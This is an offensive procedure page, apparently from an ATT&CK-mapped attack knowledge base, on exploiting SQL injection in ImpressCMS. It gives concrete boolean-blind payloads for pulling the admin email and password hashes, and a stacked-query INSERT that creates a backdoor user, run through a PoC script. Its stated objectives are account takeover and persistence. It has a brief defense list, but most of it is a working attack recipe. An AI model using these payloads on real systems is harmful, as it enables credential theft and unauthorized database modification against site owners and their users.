---
tags:
  - data-exfil
  - persistence
  - user-creation
type: procedure
tools:
  - '[[tools/sqli-php]]'
tactics:
  - '[[Collection]]'
  - '[[Persistence]]'
commands:
  - '[[commands/php-sqli-poc]]'
  - '[[commands/sqli-payload-insert]]'
verified: false
platforms:
  - Web
  - PHP
  - MySQL
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:20.590Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: c11c88dc-2346-4b00-b6c8-a3b4556953a8
validated: true
mitre_tactics:
  - '[[Collection]]'
  - '[[Persistence]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Extract-Data-or-Modify-Database-via-SQLi

## Summary

This procedure uses boolean-based blind SQLi or stacked queries to extract sensitive data from the users table (emails, password hashes) or modify the database by inserting/updating records in ImpressCMS.

## Description

Building on the injection point, boolean conditions like AND (condition) reveal data one character at a time via response differences. Stacked queries with semicolons allow INSERT/UPDATE/DELETE after guessing the table prefix (e.g., 'i36fd6f18_'). Impacts include account takeovers from hashes and persistence via new user creation. Targets MySQL backend in PHP environment; requires prior token and injection setup.

## Requirements

1. Successful SQLi injection established
2. Guessed table prefix (common patterns like random strings)
3. PoC script for automation

## Defense

Defensive measures and detection strategies:

- Use parameterized queries to prevent injection
- Disable stacked queries in MySQL config (e.g., via sql_mode)
- Monitor database logs for anomalous queries or prefix mismatches
- Implement rate limiting on findusers.php

## Objectives

1. Exfiltrate user credentials for takeover
2. Insert backdoor users for persistence
3. Perform arbitrary DB operations

## Instructions

### Step 1: Perform Boolean-Based Extraction

**Context**: Extract admin email using conditional payloads.

**Command** ([[commands/php-sqli-poc]]):
```bash
php sqli.php http://localhost/impresscms/ --extract-email
```

> Script sends payloads like groups[]=1 AND (SELECT SUBSTRING(email,1,1) FROM prefix_users WHERE uid=1)='a'. Expected output: "[-] Admin's email: admin@test.com".

### Step 2: Execute Stacked Query for Insertion

**Context**: Append INSERT to create new user.

**Command** ([[commands/sqli-payload-insert]]):
```bash
# Payload integrated in POST via script
groups[]=1); INSERT INTO i36fd6f18_users (uname) VALUES (0x414243)#
```

> Use in PoC: php sqli.php http://localhost/impresscms/ --payload "1); INSERT INTO i36fd6f18_users (uname) VALUES (0x414243)#". 0x414243 is hex for 'ABC'. Expected: New user 'ABC' in table.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]
- [[Persistence]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/php-sqli-poc]]
- [[commands/sqli-payload-insert]]

## Tools Used

- [[tools/sqli-php]]

## Tags

- exfiltration
- modification
